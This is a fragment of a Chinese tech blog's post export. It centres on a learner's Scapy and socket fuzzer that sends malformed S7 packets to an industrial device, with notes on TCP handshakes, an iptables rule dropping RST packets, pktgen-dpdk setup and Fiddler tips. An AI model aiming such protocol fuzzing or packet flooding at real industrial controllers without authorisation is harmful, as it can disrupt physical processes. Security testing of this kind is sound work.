      <content type="html"><![CDATA[<p><img src="https://ooo.0o0.ooo/2017/05/08/59101ac3d3752.jpg" alt="jack1.jpg"></p><h2 id="0x01-Bug"><a href="#0x01-Bug" class="headerlink" title="0x01 Bug"></a>0x01 Bug</h2><p>之前呢只是用scapy来单纯的实现tcp握手+s7的简单fuzz,当然只是自己觉得这个方法是可行的,写了两个吧,一个是单纯的用socket的,另一个是scapy,然后我现在发现我的脚本跑着跑着就会出一些小问题,看报错的话问题还是出在握手的时候发生了什么不可预知的错误?</p><h2 id="0x02-think"><a href="#0x02-think" class="headerlink" title="0x02 think"></a>0x02 think</h2><p>我猜测可能是这样的,因为从抓包来看的话,设备对于伪造的数据包返回的RST包并没有想象中的那么快,所以在第二轮的发包过程中,接收到了第一轮返回的RST包,所以在这过程中会收到很多keep-alive的数据包,当发包的速度快于回应的速度的时候,积累到一定程度,达到连接上限,然后下一次的连接就自然的失败并且报错了,当然,这只是我猜测的一种情况.</p><h2 id="0x03-Solution"><a href="#0x03-Solution" class="headerlink" title="0x03 Solution"></a>0x03 Solution</h2><ul><li>预想的解决办法:</li></ul><p>结合socket和scapy来同时实现这个fuzz的功能,通过socket来建立连接,而通过scapy来负责伪造发包等功能,这样是否会相对稳定,感觉在一定程度上控制了重连的频率,关于日志记录,还在想一个更好的方式来记录异常信息,但是更想要通过能实时的解析数据包是最好的选择.</p><h2 id="0x04-Do-it"><a href="#0x04-Do-it" class="headerlink" title="0x04 Do it."></a>0x04 Do it.</h2><p>两天后.</p><p>这两天又折腾了另一个版本的fuzz脚本,之前想要通过socket连接,然后获取端口后在利用scapy进行测试,但是尝试了一下之后发现好像有点儿不是很方便,或者说两者的区别没有太明显?</p><p>在上个版本的基础上升级了一下(姑且就当我的折腾是版本的升级吧),在代码中直接添加了scapy的sniff模块来过滤目标IP的数据包,在发送伪造的数据包的下一句执行监听,监听两个数据包即结束监听.</p><blockquote><p>为什么监听两个,当时的设想是可以监听到一个ack和一个rest数据包,但实际代码执行的过程中并没有收到预想中的数据包(sniff到的应该是两个重传包,重传的是设备返回的error code的数据包),所以,同样是有价值的,判断sniff到的两个数据包,可判断伪造数据包的返回状态,丢弃还是记录.</p></blockquote><blockquote><ul><li>需要考虑的一个问题:<br>iptables -A OUTPUT -p tcp –tcp-flags RST RST -j DROP<br>配置丢掉所有的RST包,那么收到RST包之的时候,谁先对其进行处理,是iptables还是wireshark?那么scapy是怎么样的?</li></ul></blockquote><h2 id="0x05-Some-supplement"><a href="#0x05-Some-supplement" class="headerlink" title="0x05 Some supplement"></a>0x05 Some supplement</h2><ul><li>通过analysis来粗略的判断返回结果,并决定是否被记录.</li></ul><p><img src="https://ooo.0o0.ooo/2017/05/08/59101b5be678a.png" alt="v0.3添加了analysis函数.png"></p><ul><li>sniffer功能没有想象中的快速,也就是返回ack的速度比执行发送之后执行下一条命令的时间要迅速.因为sniff到两个重传包就是最好的例子,当然不排除代码实现很渣导致这个原因.</li></ul><p><img src="https://ooo.0o0.ooo/2017/05/08/59101b5be7b2e.png" alt="v0.3fuzz函数添加了sniff.png"></p><ul><li>预想中的sniffer应该是单独的一个功能,通过多进程实现?不断发包的同时实时处理接收到返回信息,以此来判断是否需要重连或者继续发包.</li></ul><p><img src="https://ooo.0o0.ooo/2017/05/08/59101b822d5cd.png" alt="v0.3预想中的sniff函数.png"></p><ul><li>我还想把脚本执行过程中的那些正常情况下命令行的回显都隐藏起来,显得简洁,有报错的时候抛出异常就可以.</li></ul><h3 id="Project-Source-Code"><a href="#Project-Source-Code" class="headerlink" title="Project Source Code:"></a>Project Source Code:</h3><p><a href="https://github.com/yizhimanpadewoniu/FuzzScapy" target="_blank" rel="noopener">https://github.com/yizhimanpadewoniu/FuzzScapy</a></p><h2 id="0x06-About-blog"><a href="#0x06-About-blog" class="headerlink" title="0x06 About blog"></a>0x06 About blog</h2><ul><li>添加了评论功能,虽然我觉得这个功能目前来说确实是很扯淡的.</li></ul>]]></content>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>更换python版本for-kali</title>
      <link href="/2017/03/10/%E6%9B%B4%E6%8D%A2python%E7%89%88%E6%9C%ACfor-kali/"/>
      <url>/2017/03/10/%E6%9B%B4%E6%8D%A2python%E7%89%88%E6%9C%ACfor-kali/</url>
      <content type="html"><![CDATA[<p>我的kali有python2.7和python3.5的版本,一直想可能会有一天要用到python3的版本但是好像没有尝试怎么修改系统默认的python版本.今天终于是有需求了…..</p><h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><h4 id="修改系统的默认版本"><a href="#修改系统的默认版本" class="headerlink" title="修改系统的默认版本"></a>修改系统的默认版本</h4><blockquote><p>命令:  </p><pre><code>update-alternatives --list python  </code></pre></blockquote><blockquote><p>可能的运行结果:  </p><pre><code>root@kali:~# update-alternatives --list python  update-alternatives: error: no alternatives for python</code></pre></blockquote><blockquote><p>命令未被识别,所以:  </p></blockquote><blockquote><p>执行命令:  </p><pre><code>update-alternatives --install /usr/bin/python python /usr/bin/python2.7 1  update-alternatives --install /usr/bin/python python /usr/bin/python3.5 1</code></pre></blockquote><blockquote><p>运行结果:  </p><pre><code>root@kali:~# update-alternatives --install /usr/bin/python python /usr/bin/python2.7 1  update-alternatives: using /usr/bin/python2.7 to provide /usr/bin/python (python) in auto mode  root@kali:~# update-alternatives --install /usr/bin/python python /usr/bin/python3.5 2  update-alternatives: using /usr/bin/python3.5 to provide /usr/bin/python (python) in auto mode</code></pre></blockquote><blockquote><p>手动选择默认版本<br>update-alternatives –config python</p></blockquote><p><img src="https://ooo.0o0.ooo/2017/05/08/5910259a1f30c.png" alt="手动选择python默认版本.png">  </p><p><a href="http://www.nnbbxx.net/post-4473.html" target="_blank" rel="noopener">参考链接</a></p>]]></content>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Scapy TCP-running fuzz</title>
      <link href="/2017/03/07/scapy-TCP%E4%BA%A4%E4%BA%92-%E5%A5%94%E8%B7%91%E5%90%A7fuzz/"/>
      <url>/2017/03/07/scapy-TCP%E4%BA%A4%E4%BA%92-%E5%A5%94%E8%B7%91%E5%90%A7fuzz/</url>
      <content type="html"><![CDATA[<h2 id="0x00-写在前"><a href="#0x00-写在前" class="headerlink" title="0x00 写在前"></a>0x00 写在前</h2><p>截至到今天,分别基于socket和scapy的fuzz小脚本基本成型,可以顺利的跑起来并且可以不间断的做效率较低的协议fuzz测试,当然,协议是S7.</p><h2 id="0x01-日志方式"><a href="#0x01-日志方式" class="headerlink" title="0x01 日志方式"></a>0x01 日志方式</h2><p>最终还是采取了日志记录整个fuzz过程的方式,大致过程如下:</p><p><img src="https://ooo.0o0.ooo/2017/05/08/59101d0ab979e.png" alt="scapy_fuzz流程图.png">  </p><blockquote><p>图画的有点儿粗糙,基本上就是这样的一个流程,在发送畸形数据包之后,因为数据格式错误,所以接收到RST包,因此不断的重新握手,发送伪造的数据包.</p></blockquote><blockquote><ul><li>为什么用日志文件?</li></ul></blockquote><blockquote><blockquote><p>因为在执行过程中如果能对每次的返回数据进行分析是最好的选择,但是目前从实现看来先通过scapy的sniff模块,进行嗅探之后,直接从buffer中将flags/load等信息直接记录到文件中,当设备报错之后,我们可以从日志文件中直接找到出现文件的点以及是什么数据内容造成了设备的异常.</p></blockquote></blockquote><blockquote><ul><li>能不能跑得更快?</li></ul></blockquote><blockquote><blockquote><p>这也是我在想的问题,这样看起来,需要时间来进行fuzz测试,但是如果能提高速度,那么效率提起来之后,设备的承受能力已经是否有问题很快就可以得出结论.所以,在考虑多线程或者多进程可能会有帮助?</p></blockquote></blockquote><blockquote><ul><li>wireshark抓包过程出现伪重放</li></ul></blockquote><blockquote><blockquote><p>因为自己在循环的过程中,五元组数据中的端口没有重新随机一次,所以wireshark会识别为伪重放,但是并不影响设备的正常响应,所以解决办法也很简单的.</p></blockquote></blockquote><h2 id="0x02-待优化吧"><a href="#0x02-待优化吧" class="headerlink" title="0x02 待优化吧"></a>0x02 待优化吧</h2><ul><li>测试效率–提高速度</li><li>并发并行–两个进程</li><li>数据包格式–更有针对性</li><li>是否还有更好的方式解决问题?</li></ul><h2 id="0x03-小货车跑起来"><a href="#0x03-小货车跑起来" class="headerlink" title="0x03 小货车跑起来"></a>0x03 小货车跑起来</h2><p>终于能跑一晚上试试水了,不会写代码真的是硬伤.</p><p><img src="https://ooo.0o0.ooo/2017/05/08/59101d47624dd.png" alt="fuzz初步成功第一个晚上测试运行.png">  </p>]]></content>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Scapy TCP-push to github</title>
      <link href="/2017/03/03/scapy-TCP%E4%BA%A4%E4%BA%92-1/"/>
      <url>/2017/03/03/scapy-TCP%E4%BA%A4%E4%BA%92-1/</url>
      <content type="html"><![CDATA[<p>至此,我想我可以开始写这篇基于python、scapy的tcp交互的实现了,也许写这样的东西有点儿过时了,因为之前已经有好多人写过相关的东西,但是大家的方向不一样吧,更多的人偏向于写扫描,探测,以及简单的实现三次握手.感觉没有具体的讲某一点我觉得很重要的东西,比如是怎么实现一个完整的交互(当然可能是因为是我搜索的技术有限,没有找到相关的信息).</p><h2 id="0x00-环境"><a href="#0x00-环境" class="headerlink" title="0x00 环境"></a>0x00 环境</h2><ul><li>kali2.0 Linux</li><li>Python 2.7</li><li>scapy 2.33</li><li>Pycharm<br>*</li></ul><h2 id="0x01-TCP三次握手"><a href="#0x01-TCP三次握手" class="headerlink" title="0x01 TCP三次握手"></a>0x01 TCP三次握手</h2><p>三次握手的过程我是从网上在搜索scapy TCP交互实例的时候发现别人写的挺好的,所以直接拿来用了.2333,自己好挫……  </p><p><img src="https://ooo.0o0.ooo/2017/05/08/59101bc086424.png" alt="TCP三次握手实现代码.png"></p><p>我们通过执行脚本时传入源IP/目的IP/目的端口即可完成建立三次握手,网上很多都有讲到这个实例的实现过程,所以不多赘述.</p><blockquote><p>注意:</p></blockquote><blockquote><ul><li>这里你可能会发现运行结果的wireshark抓包显示连接没有能够正常建立,直接是RST掉了,原因是什么???</li><li>防火墙因为没有发syn包,所以对于回来的ack包直接RST掉了(就像是你没点菜服务员却告诉你你需要确认你刚刚点菜的菜单,所以你肯定是首先RST掉).</li><li><p>这两条命令就是关于这个问题的解决方式,直接配置防火墙丢掉RST包.</p><pre><code>iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROPiptables -L(查看状态~)</code></pre></li></ul></blockquote><h2 id="0x02-与设备握手交互"><a href="#0x02-与设备握手交互" class="headerlink" title="0x02 与设备握手交互"></a>0x02 与设备握手交互</h2><p>因为我自身接触的设备有一个类似于tcp三次握手的建连过程,所以在tcp建连之后还需要一次连接过程,这之间要涉及到ack和seq的问题,是我遇到的问题,不知道熟悉TCP的人会不会也遇到.</p><h4 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h4><ul><li>sr()函数拥有在第三层的接收和发送功能,所以我们通过sr()来负责发送接收含有data的数据包</li><li>send()只有发送功能,不管接收,我们可以用来发送ack等包</li></ul><p>我用word做了一个简单的TCP握手和交互的过程:  </p><p><img src="https://ooo.0o0.ooo/2017/05/08/59101be94c42c.png" alt="模拟握手和交互示例图.png"></p><blockquote><p>我们从过程中可以看出,seq和ack是在不断变化的,我们只针对客户端,我们的seq值和ack值的变化是根据上一个数据包的ack和接收到的data数据的长度来决定</p></blockquote><p><img src="https://ooo.0o0.ooo/2017/05/08/59101bfcbecb1.png" alt="wireshark已经识别了数据长度并计算了下一个ack的值.png"></p><blockquote><p>如图我们可以清楚的看到,seq值和ack的关联以及我们如果计算,那么剩下的就可以通过代码实现.</p></blockquote><p><img src="https://ooo.0o0.ooo/2017/05/08/59101c154f8b3.png" alt="seq值的实现代码.png"></p><blockquote><p>我们通过图片可以看到计算的方式是通过sr()函数接收到的数据包,来计算返回data的长度,以此来确定ack和seq.</p><p>另外,应该还要注意几个参数:</p><ul><li>timeout 和 multi</li></ul></blockquote><blockquote><pre><code>这两个参数可以延长sr()的接收数据包的等待时间,接收足够的answer数据.因为sr()返回的数据格式是tuple类型,如下图.</code></pre></blockquote><p><img src="https://ooo.0o0.ooo/2017/05/08/59101c4be07d7.png" alt="scapy收到的元组格式.png"></p><blockquote><p>第二层元组访问数据包数据:</p></blockquote><p><img src="https://ooo.0o0.ooo/2017/05/08/59101c7068ddb.png" alt="scapy查看深层的元组格式.png"></p><blockquote><p>运行程序,在结果中打印一个sr()接收到的answer数据:</p></blockquote><p><img src="https://ooo.0o0.ooo/2017/05/08/59101c80e7ac1.png" alt="scapy打印一个接收到的数据包.png"></p><blockquote><p>wireshark默认对接收到数据的处理,wireshark也计算了返回数据的长度并预算了下一个ack:</p></blockquote><p><img src="https://ooo.0o0.ooo/2017/05/08/59101c9dac38c.png" alt="scapy确定收到数据中元组的返回数据内容和长度.png"></p><p>这几张截图很关键,因为没有更好的显示方式,这里其实出现了一个问题,也就是我上面提到的要用timeout和multi这两个参数的原因,因为如果不设置等待的时间,那么我当前要测试的设备首先返回的是一个ack包而不是真正的数据包,所以等待时间不够是无法接收到真实数据并确定合理的ack和seq值.</p><p>做不到的话那么肯定是畸形数据包了,不会被接受并一直等待响应.</p><ul><li>解决办法</li></ul><blockquote><ul><li>笨办法<br>连续发包两次,第一个请求返回ack包后马上发第二个包,可以得到正确返回值<br><img src="https://ooo.0o0.ooo/2017/05/08/59101cbc87457.png" alt="同一个数据包发送两次.png"></li></ul></blockquote><blockquote><ul><li>相对较好的解决办法<br>设置足够的等待时间,然后遍历所有的数据包,从中去获得真实的返回数据的数据包.</li></ul></blockquote><p><img src="https://ooo.0o0.ooo/2017/05/08/59101ce58e064.png" alt="scapy发包命令行过程.png"></p><p><img src="https://ooo.0o0.ooo/2017/05/08/59101cf522ad9.png" alt="scapy第一次完整的运行.png"></p><h2 id="0x03-新的问题"><a href="#0x03-新的问题" class="headerlink" title="0x03 新的问题"></a>0x03 新的问题</h2><p>在接收到畸形数据之后,目标直接返回RST,但是并没有在sr之中得到一个真实的返回数据,也就是说没有返回任何东西,只有一个ack,所以下一步怎么处理RST需要考虑一下?</p>]]></content>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>python socket--Fuzz小脚本折腾记</title>
      <link href="/2017/02/28/python%E5%B0%8F%E8%84%9A%E6%9C%AC%E6%8A%98%E8%85%BE%E8%AE%B0-1/"/>
      <url>/2017/02/28/python%E5%B0%8F%E8%84%9A%E6%9C%AC%E6%8A%98%E8%85%BE%E8%AE%B0-1/</url>
      <content type="html"><![CDATA[<h2 id="0x00-搞事情吧"><a href="#0x00-搞事情吧" class="headerlink" title="0x00 搞事情吧"></a>0x00 搞事情吧</h2><p>自己想要尝试对S7协议测试,想通过在保证数据包格式正确的情况下,随意构造不真实的数据发送到目的地,一定程度上算是一种模糊测试?额~~~~</p><h2 id="0x01-整"><a href="#0x01-整" class="headerlink" title="0x01  整"></a>0x01  整</h2><ul><li>思路  </li></ul><p>数据包的标识不变,随机生成参数数据,然后通过socket,发送给目标,但是并不能保证每个数据包的内容都是有效的,可能是有很多垃圾内容,所以连接会被RST掉,考虑到这样的情况,只能是不断的重新连接、发包,重复这个过程,并且在每执行一次之后ping设备,设置超时之后将该数据包记录到日志文件中,可能此数据包生效.</p><ul><li>编程问题  </li></ul><blockquote><ul><li>自动给个位数补”0”  </li></ul></blockquote><blockquote><pre><code>a = random.randint(0,9)  # 括号里的数字表示位数b = a.zfill(3)  print b  </code></pre></blockquote><blockquote><ul><li>怎么生成随机的data部分  </li></ul></blockquote><blockquote><pre><code># 我neargle给的建议  neargle = 20  print &apos;&apos;.join(random.choice(string.digits) for i in range(neargle))  </code></pre></blockquote><blockquote><ul><li>正确生成数据  </li></ul></blockquote><blockquote><p>上面随机生成data部分不合理,我应该是随机生成十六进制的字符串是最理想的状态,在网上搜索得到了写的很好的一段代码  </p></blockquote><blockquote><pre><code>def randomString(n):      return (&apos;&apos;.join(map(lambda xx:(hex(ord(xx))[2:]),os.urandom(n))))[0:16]  # 不得不说人家写的真的到位,具体的内容参考连接:[随机生成十六进制字符串](http://blog.csdn.net/amghost/article/details/12883025)  </code></pre></blockquote><blockquote><ul><li><strong>这一点很重要</strong>  </li></ul></blockquote><blockquote><p>这一点很重要,为什么说他重要,因为我们在wireshark抓包的过程中,看到的其实是:  <strong>十六进制的ascii显示</strong>.  </p></blockquote><p><img src="https://ooo.0o0.ooo/2017/05/08/59101f58666f3.png" alt="wireshark十六进制ascii显示.png">  </p><blockquote><p>如果通过python传送的数据应该是下面的格式:  </p></blockquote><blockquote><pre><code>\x03\x00\x00\x16\x11\xe0\x00\x00\x00\x12\x00\xc1\x02\x01\x00\xc2\x02\x01\x02  </code></pre><p>而不是:  </p></blockquote><blockquote><pre><code>0300001611e00000001200c1020100c2020102  </code></pre></blockquote><blockquote><p>这两种方式的显示是一目了然的,后者明显是不会被识别为正常的格式,但是我们生成的是第二种的字符串,我们通过代码转成需要的格式直接发送给目标,中间省略将字符串先转化为”\x00”这样的过程,本来我是不懂得,但是还是找到了我认为比较好的方式,先拿来用了  </p></blockquote><blockquote><pre><code>def str2byte(data):    base = &apos;0123456789ABCDEF&apos;    i = 0    data = data.upper()    result = &apos;&apos;    while i &lt; len(data):        beg = data[i]        end = data[i+1]        i += 2        b1 = base.find(beg)        b2 = base.find(end)        if b1 == -1 or b2 == -1:            return None        result += chr((b1 &lt;&lt; 4) + b2)    return result  </code></pre><p>   当时是参照<a href="https://zhidao.baidu.com/question/1576452206019942660.html" target="_blank" rel="noopener">一篇百度知道的回答</a>  </p></blockquote><h2 id="0x02-最终"><a href="#0x02-最终" class="headerlink" title="0x02 最终"></a>0x02 最终</h2><p>所以,基本解决了上面的问题,今晚就开一整晚,让他自己去跑着测试吧,但是感觉效率还是很低,怎么办呢?暂时想不出来…  </p><p><img src="https://ooo.0o0.ooo/2017/05/08/59101f6f7fe74.png" alt="运行成功wireshark截图.png"></p>]]></content>
      
      
        <tags>
            
            <tag> PythonFuzz </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>pktgen-dpdk的踩坑过程</title>
      <link href="/2017/02/21/pktgen%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8-%E5%A3%B9/"/>
      <url>/2017/02/21/pktgen%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8-%E5%A3%B9/</url>
      <content type="html"><![CDATA[<p>##0x01 先说几句<br>我个人觉得这是一次踩坑的过程,之前也没有搞过这个东西,所以即使现在搞起来了,但是我还是不是很清楚到底是什么机制,现在想先把过程记录下来,说不定哪天懵逼的时候还能够帮得上一点点忙?<br>一开始的初衷是想要收集一款tcp的发包工具用来测试自己身边的设备性能,过程中看到了pktgen(linux内核模块),在搜索过程中发现了这篇文章提到的工具,慢慢发现这好像是两个完全不同的东西,pktgen不支持TCP,pktgen-dpdk是支持TCP的,所以开始尝试着使用这个工具.</p><p>##0x02 开整<br>整个过程都没有百度过别人的技术文档,纯粹参照官方的网站进行一步步操作的,所以可能绕了一些弯路或者怎样,看官们轻喷可好?<br><a href="http://pktgen.readthedocs.io/en/stable/index.html" target="_blank" rel="noopener">官方文档: http://pktgen.readthedocs.io/en/stable/index.html</a></p><p>step 1 环境:  </p><ul><li>使用系统版本: kali 2.0  </li><li>内核版本: 4.9.0-kali1-amd64  </li></ul><p>step 2 操作:</p><ul><li>查看官方文档,需要配置HugePages(会发现可能系统默认已经配置好)  </li><li>Get源码  </li></ul><blockquote><ul><li><p>dpdk源码  </p><p>   git clone git://dpdk.org/dpdk(你会发现失效,什么都没有clone)<br>   正确姿势: 去官网下载安装包 <a href="http://www.dpdk.org/download" target="_blank" rel="noopener">http://www.dpdk.org/download</a><br>   注意安装包版本的选择(我用了稳定版的文件),可能会直接影响到之后的编译过程  </p></li></ul></blockquote><blockquote><ul><li>pktgen-dpdk源码  </li></ul></blockquote><blockquote><pre><code>git clone http://dpdk.org/git/apps/pktgen-dpdk</code></pre></blockquote><ul><li>安装linux内核头文件以允许DPDK编译自己的模块  </li></ul><blockquote><pre><code>sudo apt-get install linux-headers-3.5.0-32-generic  </code></pre></blockquote><ul><li>你可能还需要安装依赖  </li></ul><blockquote><pre><code>sudo apt-get install libpcap-dev  </code></pre></blockquote><ul><li>设置环境变量  </li></ul><blockquote><pre><code>export RTE_SDK = /root/GitPro/dpdk(你的dpdk路径)  export RTE_TARGET=x86_64-native-linuxapp-gcc  </code></pre></blockquote><ul><li>编译dpdk  </li></ul><blockquote><pre><code>cd $RTE_SDK  make install T=x86_64-native-linuxapp-gcc  过程中出现的问题稍后总结Just ignore it.</code></pre></blockquote><ul><li>编译pktgen-dpdk  </li></ul><blockquote><pre><code>cd /root/Git/pktgen-dpdk(我的路径)  make  这里可能会报错,也可能不会,待会儿再说错误  </code></pre></blockquote><p>到此为止,再无任何错误的情况下,应该是编译这个过程搞定了,剩下的可能就是一些收尾的配置,到这里先总结几个问题.  </p><p>0x03 编译问题小结  </p><p>这些问题是否出现取决于版本问题  </p><ul><li>Installation cannot run with T defined and DESTDIR undefined  </li></ul><blockquote><p>提示你没有指定安装路径,这里我们只需要编译,本来也不需要安装,所以忽略,不影响使用   </p></blockquote><ul><li>make pktgen error1  </li></ul><p><img src="https://ooo.0o0.ooo/2017/05/08/591024ba86fad.png" alt="RTE_SDK还是之前dpdk的路径_勿修改.png">  </p><blockquote><p>这个错是低级的,因为我改动了RTE_SDK这个参数,改为指定到pktgen的路径,这完全是错误的,这个参数在第一次设置后就不需要修改,路径就是dpdk的路径  </p></blockquote><ul><li>make pktgen error2  </li></ul><p><img src="https://ooo.0o0.ooo/2017/05/08/591024ba8810c.png" alt="make_error2.png">  </p><blockquote><p>注意我的版本,我用了pktgen-dpdk 2.7.6的这个版本,有可能是版本的原因,所以可能是个人的操作的原因吧,自己去官方网站手动的去下载了安装包,直接源码make,所以出了这样或者那样的错误,直接从git克隆那个版本的就ok了,不需要这么麻烦,完成make.  </p></blockquote><p>这里需要附上一张编译成功之后的结果,会在你的路径下生成一个可执行的pktgen的文件,看似好像是成功咯?  </p><p><img src="https://ooo.0o0.ooo/2017/05/08/591024bb7823c.png" alt="编译成功结果.png"></p><h2 id="0x04-后续的问题"><a href="#0x04-后续的问题" class="headerlink" title="0x04 后续的问题"></a>0x04 后续的问题</h2><ul><li>关于setup.sh  </li></ul><blockquote><p>文章中提到,pktgen-dpdk路径下有这样一个文件,会在执行后自动的去完成一些配置,找了半天发现没有这个文件,头疼,要炸了.<br>当时突然想到是不是较低的版本有这个东西,发现确实是这样的,见下图.我直接拿来用了.  </p></blockquote><blockquote><p><img src="https://ooo.0o0.ooo/2017/05/08/591024bb79076.png" alt="两个版本的文件数对比.png"></p></blockquote><blockquote><p>当然了,你运行这个脚本会发现你可能还是有错,错误提示是找不到什么文件之类的,是因为clone下来的这个版本他确实没有,所以还是复制一份过来,这下就ok了.试着继续运行setup.sh(截图可能和当时情况有出入,但是先看着,显示的形式基本是这样的)<br><img src="https://ooo.0o0.ooo/2017/05/08/59102515ee8bb.png" alt="网卡要先down掉.png"><br>初次运行setup.sh你可能还会发现没有提示:在dpdk/tools路径下没有dpdk_nic_bind.py文件,和上面的方法一样,去复制一份过来,其他版本里有,这种方法好像很没水平,对于我这种lowB来说好像很适合.23333<br>之后运行setup.sh文件,你可能发现还是有写不对劲的地方,原因是没有绑定自己的网卡,这个文件中有几行代码是用来绑定你的网卡的,打开setup.sh文件你会发现,我们只需要修改其中的点就可以解决了  </p></blockquote><blockquote><p>查看网卡信息:<br><img src="https://ooo.0o0.ooo/2017/05/08/591025163ceaf.png" alt="绑定网卡bind.png">  </p></blockquote><blockquote><p>修改配置文件完成:<br><img src="https://ooo.0o0.ooo/2017/05/08/59102515ed58d.png" alt="绑定网卡修改setup文件.png">  </p></blockquote><blockquote><pre><code>在网卡信息的图片中可以看到:  Kernel driver in use: igb_uio(说明网卡已经成功绑定)  </code></pre></blockquote><ul><li>初次运行pktgen  </li></ul><blockquote><pre><code>./pktgen -h  </code></pre></blockquote><blockquote><p><img src="https://ooo.0o0.ooo/2017/05/08/591025471c3d7.png" alt="运行pktgen报错1-找不到pktgen.png"><br>这个问题解决方法是从Github的issue中找到解决方法的,将pktgen的可执行文件,直接拷贝到pktgen-dpdk的根目录下执行,问题就解决了.  </p></blockquote><blockquote><p><img src="https://ooo.0o0.ooo/2017/05/08/59102565ef646.png" alt="成功运行pktgen.png"><br><img src="https://ooo.0o0.ooo/2017/05/08/591025667fb4d.png" alt="执行pktgen命令1.png">  </p></blockquote><ul><li>绑定网卡  </li></ul><blockquote><p>绑定网卡的时候一定要将网卡down掉,否则setup.sh文件执行的时候会报错.  </p></blockquote><blockquote><pre><code>ifconfig eth0 down  </code></pre></blockquote><ul><li>变量设置  </li></ul><blockquote><p>关于RTE_SDK和RTE_TARGET这两个参数,因为每次重新启动之后都需要重新设置,所以你可以将这两个写入到脚本中,系统启动的时候也就设定好了.  </p></blockquote><p>##0x05 写在最后  </p><p>自己测试了一下这个东西,好像他更像是发起Dos攻击的工具,经过dpdk的包全部任何的都发送到目的IP吧,和我想要的还是有些距离,暂时和这个东西,say bye.</p>]]></content>
      
      
        <tags>
            
            <tag> TCPtools </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Scapy--初级包伪造</title>
      <link href="/2017/02/20/scapy-1-%E5%8C%85%E4%BC%AA%E9%80%A0/"/>
      <url>/2017/02/20/scapy-1-%E5%8C%85%E4%BC%AA%E9%80%A0/</url>
      <content type="html"><![CDATA[<h2 id="0×01-Scapy"><a href="#0×01-Scapy" class="headerlink" title="0×01 Scapy"></a>0×01 Scapy</h2><p>不过的多说什么是Scapy,百度谷歌一大堆解释,可以说说为什么要用它,上一篇文章<a href="https://yizhimanpadewoniu.github.io/2017/02/17/Tcpreplay-%E4%B8%80-%E2%80%94%E2%80%94%E5%88%9D%E7%9B%B8%E8%AF%86/" target="_blank" rel="noopener">《Tcpreplay(一)——初相识》</a>中提到的,自己想要进行数据包的伪造重放,因此用Scapy这个框架自己来组一个数据包试试水?  </p><h2 id="0×02-开整"><a href="#0×02-开整" class="headerlink" title="0×02 开整"></a>0×02 开整</h2><p>我用的是kali 2.0,已经集成了Scapy,但是执行起来的时候发现版本竟然是未知,好吧,覆盖安装更新到最新版本.  </p><p><img src="https://ooo.0o0.ooo/2017/05/08/59101f00680aa.png" alt="scapy_version.png"></p><p>简单的环境介绍:  </p><ul><li>kali2.0  </li><li>python2.7  </li><li>pycharm  </li></ul><h2 id="0×03-小尝试"><a href="#0×03-小尝试" class="headerlink" title="0×03 小尝试"></a>0×03 小尝试</h2><p>搞了半天的小程序,才跑起来,只有简单的几行,效果还是不错的.</p><blockquote><pre><code># encoding = utf-8from scapy.all import *# import sysdata = &quot;hello world&quot;packet = IP(src=&apos;172.18.15.199&apos;,dst=&apos;172.18.15.108&apos;)/TCP(sport=12345, dport=102)/datasend(packet, inter=1, count=1)</code></pre><p>运行抓包截图:</p></blockquote><p><img src="https://ooo.0o0.ooo/2017/05/08/59101f17ed86d.png" alt="test_scapy.png"></p><h2 id="0×04-小问题"><a href="#0×04-小问题" class="headerlink" title="0×04 小问题"></a>0×04 小问题</h2><ol><li>一个很弱智的问题,在文件命名的时候用了”scapy”,在”from scapy.all import *”的时候提示”No Module named all”,当import的时候它会找最近的,所以这里报错了.<br><a href="http://stackoverflow.com/questions/13610064/scapy-all-import-does-not-work" target="_blank" rel="noopener">参考连接:http://stackoverflow.com/questions/13610064/scapy-all-import-does-not-work</a>  </li><li>pycharm报错,但是依然可以正常执行,应该是pycharm的问题,没有缺少模块等问题,但是pycharm提示”Unsolve reference IP”.  </li></ol><h2 id="0×05-小结"><a href="#0×05-小结" class="headerlink" title="0×05 小结"></a>0×05 小结</h2><p>有了这个简单的小例子,折腾了这么一个简单的东西,下一步就是写一个半自动的小工具,提供IP和port,即发送数据包,慢慢向Fuzz的方向靠拢.</p>]]></content>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Fiddler常用几点</title>
      <link href="/2016/01/04/Fiddler%E6%8A%93%E5%8C%85%E4%BD%BF%E7%94%A8%E5%BF%83%E5%BE%97/"/>
      <url>/2016/01/04/Fiddler%E6%8A%93%E5%8C%85%E4%BD%BF%E7%94%A8%E5%BF%83%E5%BE%97/</url>
      <content type="html"><![CDATA[<h2 id="0×01-关于证书"><a href="#0×01-关于证书" class="headerlink" title="0×01 关于证书"></a>0×01 关于证书</h2><p>有些抓不到包，但是同时还会报错<br>需要到处比如网银证书，然后改名为“ClientCerficate.cer”放到Fiddler路径下</p><h2 id="0×01-快捷键"><a href="#0×01-快捷键" class="headerlink" title="0×01 快捷键"></a>0×01 快捷键</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">F2: 解除锁定，可改包，而后重放</span><br><span class="line">F11: 拦截请求，逐一改包</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2018/05/24/5b061c30643b7.png" alt="use.png"></p>]]></content>
      
      
        <tags>
            
            <tag> tools </tag>
            
            <tag> fiddler </tag>
            
        </tags>
      
    </entry>
    
  
  
</search>
